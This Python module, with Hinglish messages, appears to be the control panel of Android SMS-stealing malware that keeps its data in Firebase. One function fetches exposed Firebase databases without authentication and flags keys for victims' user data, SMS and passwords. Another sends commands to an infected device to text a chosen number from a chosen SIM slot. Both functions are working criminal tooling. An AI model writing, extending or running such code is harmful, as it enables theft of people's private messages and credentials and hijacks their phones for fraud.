import httpx
import logging

logger = logging.getLogger(__name__)

async def analyze_firebase_url(url: str) -> dict:
    """
    SECTION 1: Comprehensive Firebase URL Analysis Engine.
    Handles all 13 error scenarios.
    """
    if "firebaseio.com" not in url and ".firebasestorage.app" not in url:
        return {"status": "error", "message": "Ye valid Firebase RTDB URL nahi hai. Sahi format: https://xxx-default-rtdb.firebaseio.com/.json"}
        
    if ".firebasestorage.app" in url:
        return {"status": "error", "message": "Ye Firebase Storage Bucket hai, RTDB nahi. Realtime Database ka URL chahiye."}

    target_url = url if url.endswith(".json") else f"{url.rstrip('/')}/.json"
    
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            response = await client.get(target_url)
            
            if response.status_code == 404:
                return {"status": "error", "message": "Ye Firebase database exist nahi karta. URL check karo."}
                
            if response.status_code in (401, 403):
                return {"status": "error", "message": "Firebase rules ne access block kiya hai. Database owner se rules check karwao."}
                
            if response.status_code == 423 or "deactivated" in response.text.lower():
                return {"status": "error", "message": "Ye database deactivate ho chuka hai. Active database ka URL daalo."}
                
            if response.status_code == 200:
                try:
                    data = response.json()
                except ValueError:
                    return {"status": "error", "message": "Database se unexpected format mein data aaya. Raw response log karke admin ko notify karo."}
                
                if data is None:
                    return {"status": "warning", "message": "Database empty hai — koi data nahi mila. Phir bhi add karna hai?"}
                    
                patterns = {
                    "has_user_data": any(k in data for k in ["user_data", "Info", "All_User", "user_list", "All_Users"]) if isinstance(data, dict) else False,
                    "has_sms": any(k in data for k in ["user_sms", "sms", "messages", "Sms"]) if isinstance(data, dict) else False,
                    "has_login": any(k in data for k in ["login", "all_pas", "clients"]) if isinstance(data, dict) else False
                }
                
                return {
                    "status": "success", 
                    "data": data,
                    "patterns": patterns
                }
                
            return {"status": "error", "message": f"Firebase server error: {response.status_code}"}
            
    except httpx.ReadTimeout:
        return {"status": "error", "message": "Server respond nahi kar raha. Baad mein try karo."}
    except httpx.RequestError:
        return {"status": "error", "message": "Firebase server respond nahi kar raha. Internet check karo ya baad mein try karo."}
    except Exception as e:
        logger.error(f"Error fetching {target_url}: {e}")
        return {"status": "error", "message": "Ek unknown error aaya. Badme try karo."}

async def send_command(firebase_url: str, device_id: str, command: str, phone: str = None, text: str = None, sim: str = None, node_path: str = "user_data") -> bool:
    """Sends a Custom SMS command patch to the device target."""
    url = f"{firebase_url.rstrip('/')}/{node_path}/{device_id}.json"
    
    payload = {
        "command": command
    }
    if phone: payload["phoneNumber"] = phone
    if text: payload["messageText"] = text
    if sim: payload["simSlot"] = sim
    
    try:
        async with httpx.AsyncClient(timeout=10.0) as client:
            res = await client.patch(url, json=payload)
            return res.status_code == 200
    except Exception as e:
        logger.error(f"Error sending command to {url}: {e}")
        return False
